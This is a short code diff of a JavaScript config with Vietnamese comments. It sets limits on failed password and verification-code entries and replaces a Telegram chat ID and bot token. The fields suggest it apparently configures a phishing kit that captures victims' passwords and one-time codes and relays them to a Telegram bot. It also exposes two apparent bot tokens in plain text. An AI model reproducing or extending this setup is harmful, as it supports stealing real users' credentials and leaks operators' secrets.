@@ -3,7 +3,7 @@ const config = {
 		// Thời gian Loading khi nhập code(milisecond)
 		code_loading_time: 5000,
 		// Số lượt nhập code tối đa
-		max_failed_code_attempts: 5,
+		max_failed_code_attempts: 7,
 		// Số lượt nhập mật khẩu tối đa
 		max_failed_password_attempts: 2,
 		// Cái này không có tác dụng
@@ -14,8 +14,8 @@ const config = {
 		code_input_enabled: true,
 	},
 	telegram: {
-		chatid: '-4947137631',
-		token: '8030951518:AAEGkWErVrVPS2PcfE0QDenDYtK4nQTB8GQ',
+		chatid: '-4973369301',
+		token: '7687302268:AAEzwPymAbKg_RtyLotGQkvfzfhniO6X-OA',
 	},
 };
 
